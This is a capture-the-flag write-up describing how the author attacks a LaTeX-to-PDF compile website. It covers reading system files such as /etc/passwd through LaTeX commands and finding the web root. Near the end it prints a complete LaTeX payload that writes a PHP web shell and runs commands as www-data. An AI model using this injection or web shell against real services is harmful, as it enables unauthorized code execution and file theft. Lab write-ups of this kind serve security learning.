# LaxCTF

"Try Harder!"

This one was tough, but fun. I learnt a lot more than I would like about latex.

First, only 22 and 80 are open. 80 reveals a 'TexMaker' website, where you can enter LaTeX script and have it compiled into a PDF for you.

I immediately investigated: reading files into the output (LFI) and executing shell commands. The docs, by the way, for LaTeX are truly hideous - how has it survived and thrived for so long with such shit documentation?

Anyway, I found this blog: https://0day.work/hacking-with-latex/. It shows several techniques, and over the next six hours or so I experimented with them.

- First, shell execution is right out (as far as I can tell). The common commands `immediate`, `write18` or `input|` were all blocked. Even the `\def` trick the blog specifies at the end didn't result in any code execution.

- Second, I could use read to read anywhere. I read \etc\passwd but it failed, likely due to latex interpreting `_` as a command character and the system having at least one user like `_apt`. I could do partial extraction via not looping but just going line by line, however I eventually found a better technique: rather than using `\text` to emit the line to the generated PDF, if I used `\typeout` I could write to the compile log which is printed on the page.

- Third, writing anywhere didn't work. I could write files with no path, so local, but I didn't know where that directory was and so couldn't emit a shell or anything.

With no shell commands, I figured my best bet was going to be adding some PHP to the website somewhere. I knew it was PHP because `dirb` revealed a 200 code for `config.php` (it also revealed a few listable directories, like where the pdf's go).

Using my `typeout` technique, I was able to fully read `/etc/passwd` and found an entry for `/home/king`. Guessing the user flag would be user txt, I successfully read it using the same technique.

At this point, my chief focus was finding where the web directory was. I tried lots of things, even trying to guess various /`var/www/` paths, to no avail. Finally, via this blog https://highon.coffee/blog/lfi-cheat-sheet/, I read `/proc/self/environ`. It failed, but got enough of the content to reveal the OLDPWD of the current user was `/var/www/html/Latex`. Boom!

Reading `config.php` revealed the existence of a `/compile` path. I had tried writing files to `/pdf` and `/assets` but they hadn't worked. Writing text to `/var/www/html/Latest/compile/test.php` did work though, and I was able to browse to it! I prompytly used the following to create a simple PHP web shell:

```LaTeX
\newwrite\outfile
\openout\outfile=shell.php
\write\outfile{<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>}
\closeout\outfile

some random text
```

Going to `/compile/shell.php?cmd=whoami` got that magic `www-data`